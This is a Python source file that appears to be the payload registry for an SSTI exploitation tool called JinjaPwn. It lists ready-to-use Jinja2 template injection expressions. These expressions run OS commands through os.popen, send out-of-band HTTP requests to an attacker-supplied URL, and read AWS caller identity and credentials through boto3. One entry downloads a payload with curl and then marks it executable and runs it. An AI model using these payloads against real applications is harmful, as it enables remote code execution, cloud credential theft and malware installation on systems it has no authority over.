"""
Template registry for JinjaPwn.

How to add a new template entry (example):

TEMPLATES["items"].append({
    "label": "My Custom Payload",
    "key": "my_custom_payload",
    "description": "Describe what this action would do.",
    "params": [
        {"name": "target", "label": "Target", "type": "text", "required": True},
        {"name": "mode", "label": "Mode", "type": "select", "required": True, "choices": ["fast", "slow"]},
    ],
    # Keep expressions as placeholders only. Use {param_name} for formatting tokens.
    "expression": "{{ PLACEHOLDER_MY_ACTION(target='{target}', mode='{mode}') }}"
})
"""

TEMPLATES = {
    "version": 1,
    "items": [
        {
            "label": "System — Command Execution (Context Globals)",
            "key": "system_exec_os_popen_ctxglobals",
            "description": "Executes an OS command via os.popen (context-derived globals).",
            "params": [{"name": "command", "label": "Command", "type": "text", "required": True}],
            "expression": "{{{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('{command}').read()}}}}",
        },
        {
            "label": "System — Command Execution (Dynamic Import)",
            "key": "system_exec_os_popen_dynamic",
            "description": "Executes an OS command via os.popen (dynamically imported).",
            "params": [{"name": "command", "label": "Command", "type": "text", "required": True}],
            "expression": "{{% for x in ().__class__.__base__.__subclasses__() %}}{{% if \"warning\" in x.__name__ %}}{{{{x()._module.__builtins__['__import__']('os').popen('{command}').read()}}}}{{%endif%}}{{%endfor%}}"
        },
        {
            "label": "System — Command Execution (popen/import)",
            "key": "system_exec_os_popen_direct_import",
            "description": "Executes an OS command via os.popen (directly imported).",
            "params": [{"name": "command", "label": "Command", "type": "text", "required": True}],
            "expression": "{{{{self.__init__.__globals__.__builtins__.eval(\"__import__('os').popen('{command}').read()\")}}}}",
        },
        {
            "label": "Test — SSTI Expression (Randomized)",
            "key": "test_ssti_jinja_expression",
            "description": "Generate a randomized Jinja expression to test for SSTI.",
            "params": [],
            "expression": "{{{{ {0} }}}}"
        },
        {
            "label": "HTTP — Out-of-Band Request (requests/import)",
            "key": "http_oob_request_requests",
            "description": "Issues an out-of-band HTTP request using requests.",
            "params": [{"name": "url", "label": "Attacker URL", "type": "url", "required": True}],
            "expression": "{{% for x in ().__class__.__base__.__subclasses__() %}}{{% if \"warning\" in x.__name__ %}}{{{{x()._module.__builtins__['__import__']('requests').get('{url}')}}}}{{%endif%}}{{%endfor%}}",
        },
        {
            "label": "HTTP — GET + Return Response Body (requests/import)",
            "key": "http_get_body_requests",
            "description": "Performs an HTTP GET using requests and returns the response body.",
            "params": [{"name": "url", "label": "Attacker URL", "type": "url", "required": True}],
            "expression": "{{% for x in ().__class__.__base__.__subclasses__() %}}{{% if \"warning\" in x.__name__ %}}{{{{x()._module.__builtins__['__import__']('requests').get('{url}').text}}}}{{%endif%}}{{%endfor%}}",
        },
        {
            "label": "HTTP — GET + Return Response Body (urllib3/import)",
            "key": "http_get_body_urllib3",
            "description": "Performs an HTTP GET using urllib3 and returns the response body.",
            "params": [{"name": "url", "label": "Attacker URL", "type": "url", "required": True}],
            "expression": "{{% for x in ().__class__.__base__.__subclasses__() %}}{{% if \"warning\" in x.__name__ %}}{{{{x()._module.__builtins__['__import__']('urllib3').PoolManager().request('GET', '{url}').data.decode()}}}}{{%endif%}}{{%endfor%}}",
        },
        {
            "label": "AWS — Caller Identity (boto3/import)",
            "key": "aws_sts_caller_identity_boto3_import",
            "description": "Retrieves AWS STS caller identity using boto3 (imported).",
            "params": [],
            "expression": "{{% for x in ().__class__.__base__.__subclasses__() %}}{{% if \"warning\" in x.__name__ %}}{{{{x()._module.__builtins__['__import__']('boto3').client('sts').get_caller_identity()}}}}{{%endif%}}{{%endfor%}}",
        },
        {
            "label": "AWS — Caller Identity (boto3/eval)",
            "key": "aws_sts_caller_identity_boto3_eval",
            "description": "Retrieves AWS STS caller identity using boto3 (eval).",
            "params": [],
            "expression": "{{{{self.__init__.__globals__.__builtins__.eval(\"__import__('boto3').client('sts').get_caller_identity()\")}}}}",
        },
        {
            "label": "AWS — Credentials (boto3/import)",
            "key": "aws_credentials_boto3_import",
            "description": "Retrieves AWS credentials via boto3 Session (imported).",
            "params": [],
            "expression": "{{% for x in ().__class__.__base__.__subclasses__() %}}{{% if \"warning\" in x.__name__ %}}{{{{x()._module.__builtins__['__import__']('boto3').Session().get_credentials().get_frozen_credentials()}}}}{{%endif%}}{{%endfor%}}",
        },
        {
            "label": "AWS — Credentials (boto3/eval)",
            "key": "aws_credentials_boto3_eval",
            "description": "Retrieves AWS credentials via boto3 Session (eval).",
            "params": [],
            "expression": "{{{{self.__init__.__globals__.__builtins__.eval(\"__import__('boto3').Session().get_credentials().get_frozen_credentials()\")}}}}",
        },
        {
            "label": "System — Fetch & Execute (curl)",
            "key": "artifact_fetch_exec_curl",
            "description": "Fetches an artifact using curl and executes it (local runtime).",
            "params": [
                {"name": "url", "label": "Payload URL", "type": "url", "required": True},
                {"name": "file_name", "label": "File Name to Save on Disk", "type": "text", "required": True}
            ],
            "expression": "{{{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl {url} -o {file_name} && chmod +x {file_name} && {file_name}').read()}}}}",
        }
    ],
}


